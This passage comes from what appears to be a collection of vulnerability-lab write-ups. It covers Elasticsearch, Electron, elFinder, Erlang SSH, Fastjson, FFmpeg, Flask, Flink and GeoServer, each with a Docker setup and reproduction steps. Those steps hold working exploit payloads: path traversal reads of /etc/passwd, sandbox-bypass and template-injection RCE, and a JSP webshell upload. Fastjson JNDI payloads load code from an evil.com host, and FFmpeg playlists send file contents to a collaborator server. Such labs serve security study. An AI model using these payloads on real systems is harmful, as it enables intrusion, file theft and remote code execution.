1. Create a Repository


PUT /_snapshot/test HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    ""type"": ""fs"",
    ""settings"": {
        ""location"": ""/usr/share/elasticsearch/repo/test"" 
    }
}




2. Create a Snapshot


PUT /_snapshot/test2 HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    ""type"": ""fs"",
    ""settings"": {
        ""location"": ""/usr/share/elasticsearch/repo/test/snapshot-backdata"" 
    }
}




3. Exploit Directory Traversal to Read Files

Send a request to read arbitrary files using directory traversal. For example, to read /etc/passwd:


http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd




The file content will be included in the error message (encoded). After decoding, you can obtain the file content:
-------------------------------------------------------------------------------","https://www.exploit-db.com/exploits/38383/
http://www.freebuf.com/vuls/99942.html"
elasticsearch,CVE-2015-1427,ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427),"ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

ElasticSearch versions prior to 1.3.8 and 1.4.3 contain a vulnerability in the Groovy scripting engine that allows attackers to bypass the sandbox protection and execute arbitrary code on the server.

After CVE-2014-3120, ElasticSearch changed its default dynamic scripting language to Groovy and added a sandbox. However, dynamic language execution remained enabled by default. This vulnerability involves:

1. A sandbox bypass
2. A Groovy code execution vulnerability

ElasticSearch supports using ""sandboxed"" Groovy language as a dynamic scripting engine. However, the sandbox implementation was insufficient. Two methods for command execution were discovered:

1. Lupin's method: Bypass the Java sandbox using reflection
2. Tang3's method: Use Groovy language features to execute commands directly, without using Java

Based on these approaches, we have two different POCs.

Java sandbox bypass method:

groovy
java.lang.Math.class.forName(""java.lang.Runtime"").getRuntime().exec(""id"").getText()


Groovy direct command execution method:

groovy
def command='id';def res=command.execute().text;res


References:
<http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
<https://github.com/XiphosResearch/exploits
<http://cb.drops.wiki/drops/papers-5107.html
<http://cb.drops.wiki/drops/papers-5142.html

Environment Setup

Execute the following commands to start a 1.4.2 version ElasticSearch server:


docker compose up -d


After the server starts, you can access the ElasticSearch server at http://your-ip:9200.

Vulnerability Reproduction

Since querying requires at least one document in the index, first send the following request to add data:


POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  ""name"": ""test""
}


Then send a request containing the payload to execute arbitrary commands:


POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{""size"":1, ""script_fields"": {""lupin"":{""lang"":""groovy"",""script"": ""java.lang.Math.class.forName(\""java.lang.Runtime\"").getRuntime().exec(\""id\"").getText()""}}}


The command execution result will be returned in the response:
-------------------------------------------------------------------------------","http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
https://github.com/XiphosResearch/exploits
http://cb.drops.wiki/drops/papers-5107.html
http://cb.drops.wiki/drops/papers-5142.html"
elasticsearch,Unknown,ElasticSearch Arbitrary File Upload (WooYun-2015-110216),"ElasticSearch Arbitrary File Upload (WooYun-2015-110216)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

A vulnerability in ElasticSearch's backup functionality allows attackers to write arbitrary files to the filesystem, potentially leading to webshell upload when combined with other web services.

ElasticSearch includes a data backup feature that allows users to specify a path where backup data will be stored. Both the path and file names are controllable by the user.

If other web services (like Tomcat, PHP, etc.) are running on the same system, an attacker can exploit ElasticSearch's backup functionality to write a webshell to a web-accessible directory.

Similar to CVE-2015-5531, this vulnerability is related to the backup repository functionality. In ElasticSearch versions after 1.5.1, the root path of backup repositories is restricted to the path.repo configuration option. If administrators don't configure this option, the backup functionality is disabled by default. Even if configured, writing a webshell is only possible if the web root is within the configured directory.

References:
<http://cb.drops.wiki/bugs/wooyun-2015-0110216.html

Environment Setup

Execute the following commands to start a ElasticSearch server 1.5.1, and a Tomcat server is running on the same container:


docker compose up -d


After the environment starts, you can access the ElasticSearch server at http://your-ip:9200, and the Tomcat server at http://your-ip:8080.

Tomcat is installed in /usr/local/tomcat with its web directory at /usr/local/tomcat/webapps. ElasticSearch is installed in /usr/share/elasticsearch.

Vulnerability Reproduction

Our goal is to use ElasticSearch to write a webshell into /usr/local/tomcat/webapps.

First, create a malicious index document:


curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'
{""<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%"":""test""}
'


Then create a malicious repository. The location value is the path where we want to write our file.

Note: The Repositories path is interesting because it can write to any accessible location, and if the path doesn't exist, it will be created automatically. This means you can create arbitrary directories using the file access protocol. Here we point the path to Tomcat's web deployment directory because Tomcat will automatically create a new application when a folder is created in this directory (if the filename is wwwroot, the created application name will be wwwroot).


curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{
     ""type"": ""fs"",
     ""settings"": {
          ""location"": ""/usr/local/tomcat/webapps/wwwroot/"",
          ""compress"": false
     }
}'


Verify and create the repository:


curl -XPUT ""http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp"" -d '{
     ""indices"": ""yz.jsp"",
     ""ignore_unavailable"": ""true"",
     ""includeglobalstate"": false
}'


Done!

Access http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp to find our uploaded webshell.

This shell allows writing arbitrary strings to test.jsp in the wwwroot directory. For example: http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success. Then accessing /wwwroot/test.jsp will show ""success"":
-------------------------------------------------------------------------------","http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
http://127.0.0.1:9200/yz.jsp/yz.jsp/1"
electron,CVE-2018-15685,Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）,"Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）

中文版本(Chinese version)

Electron is an open source library developed by GitHub for building cross-platform desktop applications with HTML, CSS, and JavaScript. Electron accomplishes this by combining Chromium and Node.js into a single runtime and apps can be packaged for Mac, Windows, and Linux.

When Electron sets nodeIntegration=false (default), the JavaScript in the page cannot access the built-in library of node.js. CVE-2018-15685 bypass this limitation, enabling arbitrary commands to be executed if the user can execute JavaScript (such as when accessing a third-party page or an XSS vulnerability exists in the app).

Reference links:
https://electronjs.org/blog/web-preferences-fix
https://www.contrastsecurity.com/security-influencers/cve-2018-15685

Compile application

Execute the following command to compile an  vulnerability application:


docker compose run -e PLATFORM=win64 --rm electron


The value of PLATFORM is the operating system on which the application is running. The options are:win64、win32、mac、linux。

After the compilation completed, execute the following command to run the web service:


docker compose run --rm -p 8080:80 web


Now，accesshttp://your-ip:8080/cve-2018-15685.tar.gzto download application.

expliot

Open the app:



Click submit, the content in the input box will be displayed in the app, and there is obviously an XSS vulnerability.

We submit <img src=1 onerror=""require('child_process').exec('calc.exe')""and find that nothing happens, because nodeIntegration=false.

At this time, submit the POC (Windows):


<img src=1 onerror=""window.open().open('data:text/html,<scriptrequire(\'child_process\').exec(\'calc.exe\')</script');""


As you see, calc.exe shows up.
-------------------------------------------------------------------------------","https://electronjs.org/blog/web-preferences-fix
https://www.contrastsecurity.com/security-influencers/cve-2018-15685"
electron,CVE-2018-1000006,Electron Remote Code Execution Vulnerability（CVE-2018-1000006）,"Electron Remote Code Execution Vulnerability（CVE-2018-1000006）

中文版本(Chinese version)

Electron is an open source library developed by GitHub for building cross-platform desktop applications with HTML, CSS, and JavaScript. Electron accomplishes this by combining Chromium and Node.js into a single runtime and apps can be packaged for Mac, Windows, and Linux.

On Windows, if an application developed by Electron registers a Protocol Handler (allowing the user to call the application in the browser), a parameter injection vulnerability may occur and eventually cause remote code vulnerability on the user side.

Reference link:Electron < v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】

Setup

Execute the following commands to compile an vulnerability application:


docker compose run -e ARCH=64 --rm electron


Because the software needs to run on the Windows platform, it is necessary to set the value of the ARCH to the number of bits of the platform: 32 or 64.

After the compilation completed, execute the following command to run the web service:


docker compose run --rm -p 8080:80 web


Now, accesshttp://your-ip:8080/You can see the POC page.

Exploit

First, on the POC page, click on the first link and download the compiled software vulhub-app.tar.gz. After the download is complete, extract it and run it once:



This time the Protocol Handler will be registered.

Then, go back to the POC page and click on the second link. The target software and calculator will pop up:



If fails, it may be browser's reason. After testing, the new Chrome browser will call vulhub-app when it clicks on the POC, but it will not execute calc.exe.
-------------------------------------------------------------------------------",
elfinder,CVE-2021-32682,elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682),"elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)

中文版本(Chinese version)

elFinder is an open-source file manager for web, written in JavaScript using jQuery UI.

There is a arguments injection vulnerability found in the elFinder 2.1.48 and before. This vulnerability can allow an attacker to execute arbitrary commands on the server hosting the elFinder PHP connector, even with minimal configuration. The issues were patched in version 2.1.59. As a workaround, ensure the connector is not exposed without authentication.

References:
<https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
<https://packetstormsecurity.com/files/164173/elfinderarchivecmd_injection.rb.txt
<https://xz.aliyun.com/t/10739

Vulnerability Environment

Execute following command to start a elFinder 2.1.48:


docker compose up -d


After the server is started, you can see the main page of elFinder at http://your-ip:8080.

Vulnerability Reproduce

Firstly, you should prepare 2 files for this vulnerability flow.

Create a plain text file named 1.txt:



Archive this file in the right-click menu to ZIP format, and modify this archived file name to 2.zip:



1.txt and 2.zip are ready here:



Then, send the following request to execute arbitrary commands:


GET /php/connector.minimal.php?cmd=archive&name=-TvTT=idshell.php%20%23%20a.zip&target=l1Lw&targets%5B1%5D=l1Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, /; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close




In this request, you can see 3 important parameters:
name, its value is equal to -TvTT=idshell.php # a.zip, you can modify the idshell.php to arbitrary commands
targets[0], its value is equal to l1_MS50eHQ. l1 means the first storage volume, MS50eHQ is the base64 encoded string of 1.txt
targets[1], its value is equal to l1_Mi56aXA. l1 means the first storage volume, Mi56aXA is the base64 encoded string of 2.zip

Although this request responeds to an error message, our command has been executed and shell.php has been written to http://your-ip:8080/files/shell.php:
-------------------------------------------------------------------------------","https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
https://xz.aliyun.com/t/10739
http://localhost.lan:8080/"
erlang,CVE-2025-32433,Unauthenticated Remote Code Execution in Erlang/OTP SSH (CVE-2025-32433),"Unauthenticated Remote Code Execution in Erlang/OTP SSH (CVE-2025-32433)

中文版本(Chinese version)

Erlang/OTP SSH is the built-in SSH server component of the Erlang/OTP platform.

A critical vulnerability was discovered in the Erlang/OTP SSH server, allowing attackers to execute arbitrary system commands remotely without authentication by crafting specific SSH protocol messages. Affected versions include OTP-27.3.2 and earlier, OTP-26.2.5.10 and earlier, and OTP-25.3.2.19 and earlier.
<https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
<https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd
<https://github.com/ProDefense/CVE-2025-32433
<https://datatracker.ietf.org/doc/html/rfc4254

Environment Setup

Run the following command to start an Erlang/OTP 27.3.2 based SSH server:


docker compose up -d


After startup, the container runs an Erlang SSH service listening on port 2222, which is mapped to the host's port 2222. You can access it using SSH tools or the provided exploit script.

Vulnerability Reproduction

Use the provided exploit.py script to reproduce the vulnerability. For example, the following command will create a file inside the target container:


python exploit.py -t 127.0.0.1 -p 2222 -c ""touch /tmp/success""




The script sends a specially crafted SSHMSGCHANNEL_REQUEST (message number 94) packet, exploiting a flaw in the server's message handling to execute arbitrary commands during the unauthenticated phase. According to RFC 4254, the message structure is as follows:


byte      SSHMSGCHANNEL_REQUEST
uint32    recipient channel
string    ""exec""
boolean   want reply
string    command


After successful exploitation, you can enter the container and see that the /tmp/success file has been created.
-------------------------------------------------------------------------------","https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd
https://github.com/ProDefense/CVE-2025-32433
https://datatracker.ietf.org/doc/html/rfc4254"
fastjson,Unknown,Fastjson 1.2.47 Deserialization Remote Command Execution,"Fastjson 1.2.47 Deserialization Remote Command Execution

中文版本(Chinese version)

Fastjson is a JSON parser developed by Alibaba, known for its superior performance and widely used in Java projects across various companies. After version 1.2.24, Fastjson added a deserialization whitelist. However, in versions prior to 1.2.48, attackers could bypass the whitelist check using specially crafted JSON strings and successfully execute arbitrary commands.

References:
<https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
<https://www.freebuf.com/vuls/208339.html

Environment Setup

Execute the following command to start a Spring web project that uses Fastjson 1.2.45 as its default JSON parser:

shell
docker compose up -d


After the server starts, visit http://your-ip:8090 to see a JSON object returned. You can POST new JSON objects by changing the content-type to application/json, and the backend will use Fastjson to parse them.

Vulnerability Reproduction

The target environment is openjdk:8u102, which doesn't have the com.sun.jndi.rmi.object.trustURLCodebase restriction. We can easily execute commands using RMI.

First, compile and upload the command execution code, such as http://evil.com/TouchFile.class:

java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {""touch"", ""/tmp/success""};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}


Then, using the marshalsec project, start an RMI server listening on port 9999 and specify loading the remote class TouchFile.class:

shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer ""http://evil.com/#TouchFile"" 9999


Send the payload to the target server:


{
    ""a"":{
        ""@type"":""java.lang.Class"",
        ""val"":""com.sun.rowset.JdbcRowSetImpl""
    },
    ""b"":{
        ""@type"":""com.sun.rowset.JdbcRowSetImpl"",
        ""dataSourceName"":""rmi://evil.com:9999/Exploit"",
        ""autoCommit"":true
    }
}




As shown below, the command touch /tmp/success has been successfully executed:



For more exploitation methods, please refer to JNDI injection related knowledge.
-------------------------------------------------------------------------------","https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
https://www.freebuf.com/vuls/208339.html"
fastjson,Unknown,"Alert

This file is move to Here
-------------------------------------------------------------------------------","Alert

This file is move to Here
-------------------------------------------------------------------------------",
fastjson,Unknown,Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349),"Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349)

中文版本(Chinese version)

Fastjson is a JSON parser developed by Alibaba. During the JSON parsing process, it supports using autoType to instantiate a specific class and call its set/get methods to access properties. By identifying relevant methods in the code, malicious exploitation chains can be constructed.

References:
<https://www.freebuf.com/vuls/208339.html
<http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/

Environment Setup

Execute the following command to start the test server that use Fastjson 1.2.24 as the default JSON parser:


docker compose up -d


After the server is started, visit http://your-ip:8090 to see a JSON format output.

You can update the server information by POSTing a JSON object to this address:


curl http://your-ip:8090/ -H ""Content-Type: application/json"" --data '{""name"":""hello"", ""age"":20}'


Vulnerability Reproduction

Since the target environment is Java 8u102, which doesn't have the com.sun.jndi.rmi.object.trustURLCodebase restriction, we can use the com.sun.rowset.JdbcRowSetImpl exploitation chain to execute commands through JNDI injection.

First, compile and upload the command execution code, such as http://evil.com/TouchFile.class:

java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {""touch"", ""/tmp/success""};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}


Then, using the marshalsec project, start an RMI server listening on port 9999 and specify loading the remote class TouchFile.class:

shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer ""http://evil.com/#TouchFile"" 9999


Send the payload to the target server with the RMI address:


POST / HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 160

{
    ""b"":{
        ""@type"":""com.sun.rowset.JdbcRowSetImpl"",
        ""dataSourceName"":""rmi://evil.com:9999/TouchFile"",
        ""autoCommit"":true
    }
}


As shown below, the command touch /tmp/success has been successfully executed:
-------------------------------------------------------------------------------","https://www.freebuf.com/vuls/208339.html
http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
http://your-ip:8090/"
ffmpeg,CVE-2017-9993,FFmpeg AVI Arbitrary File Read (CVE-2017-9993),"FFmpeg AVI Arbitrary File Read (CVE-2017-9993)

中文版本(Chinese version)

FFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams.

FFmpeg 2.4.x before 2.4.14, 2.8.x before 2.8.12, 3.0.x before 3.0.9, 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.

This issue was featured in PHDays conference 2017, and it is actually an incomplete fix for CVE-2016-1897. FFmpeg officially patched file reading and SSRF vulnerabilities in m3u playlists. However, by crafting malicious AVI files, similar vulnerabilities still exist in the playlist, leading to CVE-2017-9993.

References:
<https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/
<https://github.com/neex/ffmpeg-avi-m3u-xbin
<https://www.anquanke.com/post/id/86337

Environment Setup

Execute the following commands to build and start the environment:


docker compose up -d


After the server starts, it will listen on port 8080. Visit http://your-ip:8080/ to access the application, the application is a simple video player that allows users to upload and play videos.

Vulnerability Reproduction

First, download the exploit tool and generate a malicious payload:

bash
Clone the exploit repository
git clone https://github.com/neex/ffmpeg-avi-m3u-xbin
cd ffmpeg-avi-m3u-xbin

Generate payload
./genxbinavi.py file:///etc/passwd exp.avi


Upload the generated exp.avi file at http://your-ip:8080/. The backend will attempt to transcode your uploaded video using FFmpeg. During this process, due to the arbitrary file read vulnerability, the file content will be embedded in the transcoded video:



You can also execute docker compose exec web bash to enter the environment and test FFmpeg directly.
-------------------------------------------------------------------------------","https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/
https://github.com/neex/ffmpeg-avi-m3u-xbin
https://www.anquanke.com/post/id/86337
https://github.com/neex/ffmpeg-avi-m3u-xbin"
ffmpeg,CVE-2016-1897,FFmpeg Arbitrary File Read and SSRF (CVE-2016-1897/CVE-2016-1898),"FFmpeg Arbitrary File Read and SSRF (CVE-2016-1897/CVE-2016-1898)

中文版本(Chinese version)

FFmpeg is a popular multimedia framework that can handle various audio and video formats. In the FFmpeg version prior to 2.8.5, 2.7.5, 2.6.7, 2.5.10, 2.4.13, two vulnerabilities were discovered that could allow attackers to read arbitrary files (CVE-2016-1897) or perform Server-Side Request Forgery (SSRF) attacks (CVE-2016-1898).

References:
<https://tttang.com/archive/465/
<http://habrahabr.ru/company/mailru/blog/274855/
<http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/

Environment Setup

Execute the following commands to build and start the environment:


docker compose up -d


After the server starts, it will listen on port 8080. Visit http://your-ip:8080/ to access the application, the application is a simple video player that allows users to upload and play videos.

Vulnerability Reproduction

Upload the following poc to reproduce the SSRF vulnerability using collaborator server:


EXTM3U
EXT-X-MEDIA-SEQUENCE:0
EXTINF:10.0,
http://collaborator/ssrf
EXT-X-ENDLIST


As you can see, the collaborator server will receive the request:



To reproduce the arbitrary file reading, you should serve a intermediate file on an accessible server (for example, http://intermediate.example.com/intermediate.m3u8) with following content:


EXTM3U
EXT-X-MEDIA-SEQUENCE:0
EXTINF:,
http://collaborator/fileread?


The content of the files you stole will be sent to the collaborator server specified in the intermediary file above.

Then, use the intermediate file to construct the POC and upload it:


EXTM3U
EXT-X-MEDIA-SEQUENCE:0
EXTINF:10.0,
concat:http://intermediate.example.com/intermediate.m3u8|subfile,,start,0,end,31,,:file:///etc/passwd|subfile,,start,32,end,63,,:file:///etc/passwd|subfile,,start,64,end,95,,:file:///etc/passwd|subfile,,start,96,end,127,,:file:///etc/passwd|subfile,,start,127,end,158,,:file:///etc/passwd
EXT-X-ENDLIST


As you can see, the collaborator server will receive the request that contains the content of /etc/passwd:
-------------------------------------------------------------------------------","https://tttang.com/archive/465/
http://habrahabr.ru/company/mailru/blog/274855/
http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
flask,Unknown,Flask (Jinja2) Server-Side Template Injection,"Flask (Jinja2) Server-Side Template Injection

中文版本(Chinese version)

Flask is a popular Python web framework that uses Jinja2 as its template engine. A Server-Side Template Injection (SSTI) vulnerability can occur when user input is directly rendered in Jinja2 templates without proper sanitization, potentially leading to remote code execution.

References:
<https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
<http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates

Environment Setup

Execute the following commands to build and start a Web application based on Flask 1.1.1:


docker compose up -d


After the server starts, visit http://your-ip:8000/ to view the default page.

Vulnerability Reproduction

First, verify the SSTI vulnerability exists by visiting:


http://your-ip:8000/?name={{233*233}}


If you see the result 54289, it confirms the presence of the SSTI vulnerability.

To achieve remote code execution, you can use the following POC that obtains the eval function and executes arbitrary Python code:

python
{% for c in [].class.base.subclasses() %}
{% if c.name == 'catch_warnings' %}
  {% for b in c.init.globals.values() %}
  {% if b.class == {}.class %}
    {% if 'eval' in b.keys() %}
      {{ b'eval'.popen(""id"").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}


Visit the following URL (with the POC URL-encoded) to execute the command:


http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.class.base.subclasses()%20%25%7D%0A%7B%25%20if%20c.name%20%3D%3D%20%27catchwarnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.init.globals.values()%20%25%7D%0A%20%20%7B%25%20if%20b.class%20%3D%3D%20%7B%7D.class%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27import_(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D


The command execution result will be displayed:
-------------------------------------------------------------------------------","https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates"
flink,CVE-2020-17518,Apache Flink Upload Path Traversal (CVE-2020-17518),"Apache Flink Upload Path Traversal (CVE-2020-17518)

中文版本(Chinese version)

Apache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities.

A vulnerability in Apache Flink 1.5.1 and later versions allows attackers to write uploaded files to arbitrary locations on the local file system through a maliciously crafted HTTP header in the REST API request. This issue is fixed in Apache Flink 1.11.3.

References:
<https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4
<https://nvd.nist.gov/vuln/detail/CVE-2020-17518

Environment Setup

Execute the following command to start an Apache Flink jobmanager 1.11.2:


docker compose up -d


After the Apache Flink service is started, visit http://your-ip:8081 to access the management interface.

Vulnerability Reproduction

Send the following HTTP request to upload a file to /tmp/success on the target server:


POST /jars/upload HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 187
-----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name=""jarfile""; filename=""../../../../../../tmp/success""

success
-----WebKitFormBoundaryoZ8meKnrrso89R6Y--


After the file is uploaded, you can check the /tmp/success file on the target server:
-------------------------------------------------------------------------------","https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4
https://nvd.nist.gov/vuln/detail/CVE-2020-17518"
flink,CVE-2020-17519,Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519),"Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519)

中文版本(Chinese version)

Apache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities.

A vulnerability introduced in Apache Flink 1.11.0 (and present in versions 1.11.1 and 1.11.2) allows attackers to read arbitrary files from the local filesystem through the JobManager's REST interface. This path traversal vulnerability exists in the log viewing functionality.

References:
<https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801
<https://nvd.nist.gov/vuln/detail/CVE-2020-17519

Environment Setup

Execute the following command to start an Apache Flink jobmanager 1.11.2:


docker compose up -d


After the Apache Flink service is started, visit http://your-ip:8081 to access the management interface.

Vulnerability Reproduction

Access the following URL to read the contents of /etc/passwd file from the target server:


http://your-ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
-------------------------------------------------------------------------------","https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801
https://nvd.nist.gov/vuln/detail/CVE-2020-17519"
geoserver,CVE-2024-36401,GeoServer Unauthenticated Remote Code Execution in Evaluating Property Name Expressions (CVE-2024-36401),"GeoServer Unauthenticated Remote Code Execution in Evaluating Property Name Expressions (CVE-2024-36401)

中文版本(Chinese version)

GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.

In the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.

References:
<https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
<https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w
<https://tttang.com/archive/1771/
<https://github.com/Warxim/CVE-2022-41852

Vulnerable environment

Execute following command to start a GeoServer server 2.23.2:


docker compose up -d


After server is started, you will see the default page of GeoServer at http://your-ip:8080/geoserver.

Exploit

In the official vulnerability announcement, you can find the following content:

No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.

For example, I gonna to use GetPropertyValue to execute evil xpath expression. refer to official document, the GET method POC is:


GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0




The POST method POC is:


POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
